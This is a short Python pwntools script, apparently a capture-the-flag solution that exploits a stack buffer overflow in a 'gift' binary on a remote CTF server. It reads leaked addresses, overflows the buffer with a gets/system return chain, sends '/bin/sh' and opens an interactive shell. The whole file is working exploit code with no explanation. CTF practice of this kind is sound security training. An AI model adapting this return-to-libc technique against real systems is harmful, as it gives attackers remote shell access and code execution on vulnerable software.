from pwn import *
r=remote("ctf.j0n9hyun.xyz",3018)
#r=process("./gift")
r.recvuntil(": ")
s=r.recvline().strip()
s=s.split()
context.log_level='debug'

pay1="this is fake haha"
r.sendline(pay1)

pay2=""
pay2+='x'*0x88
pay2+=p32(0x80483d0) #gets
pay2+=p32(int(s[1],16)) #ret
pay2+=p32(int(s[0],16)) #arg
pay2+=p32(int(s[0],16)) #system-arg

r.sendline(pay2)
r.sendline('/bin/sh\x00')

r.interactive()
